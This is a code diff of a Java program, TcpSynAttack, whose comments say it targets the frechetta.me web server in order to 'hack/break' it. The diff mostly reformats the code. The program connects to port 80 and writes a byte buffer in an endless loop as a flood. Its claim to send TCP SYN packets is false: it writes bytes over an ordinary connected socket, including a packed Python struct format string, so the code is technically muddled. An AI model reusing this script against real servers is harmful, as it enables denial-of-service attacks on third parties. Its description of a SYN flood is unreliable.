@@ -1,3 +1,9 @@
+/** 
+* <b> TCP Attack </b>
+* @author Edgar Delgado
+* This connects to frechetta.me web server and spams TCP SYN packets
+*/
+
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.IOException;
@@ -8,12 +14,14 @@ import java.nio.ByteBuffer;
 
 public class TcpSynAttack {
 
+  // Main method  
   public static void main(String[] args) {
     boolean timeToExit = false; 
 
-    /*Declaring all variables that are going to get send via a packet
+    /* Declaring all variables that are going to get send via a packet
     to send a packet with different types of variables we need to 
-    convert everything into bytes*/
+    convert everything into bytes */
+
     String characters = "!BBHHHBBH4s4s";
     //converting the string called characters into bytes
     byte[] charactersBytes = characters.getBytes(); 
@@ -40,11 +48,12 @@ public class TcpSynAttack {
       //creating a socket with the host of "frechetta.me" 
       //which is the website we are trying to hack/break
       //80 is the port number for websites
-      socket = new Socket("frechetta.me", 80); 	
+      socket = new Socket("frechetta.me", 80);  
     } catch (Exception e) {
       System.out.println("Connection FAILED!!! Failed to open connection to a socket.");
       System.exit(0); //if it fails the program ends
     }
+    
     System.out.println("Success");
 
     //We create a byteBuffer object which is going to be use to load everything into bytes
@@ -80,23 +89,19 @@ public class TcpSynAttack {
       long endTime = System.currentTimeMillis();
       if (endTime - startTime < 60) {
         try (DataOutputStream sendToServer = new DataOutputStream(socket.getOutputStream())) {
-	  while (timeToExit != true) {
-		        //we send the packet as an array to the website/server
-	            sendToServer.write(arr, 0, size);
-	            sent++;
-	            System.out.println("Packt got sent");
-	        }
-
-	     }
-	     catch (IOException ex) {
-	            System.out.println("Cannot send packet");
-	            System.exit(0);
-	      }
-	   }
-	    else {
-	    	System.exit(0);
-	    }
-	}
-	}
-
+          while (timeToExit != true) {
+            //we send the packet as an array to the website/server
+            sendToServer.write(arr, 0, size);
+            sent++;
+            System.out.println("Packt got sent");
+          }
+        } catch (IOException ex) {
+          System.out.println("Cannot send packet");
+          System.exit(0);
+        }
+      } else {
+        System.exit(0);
+      }
+    }
+  }
 }
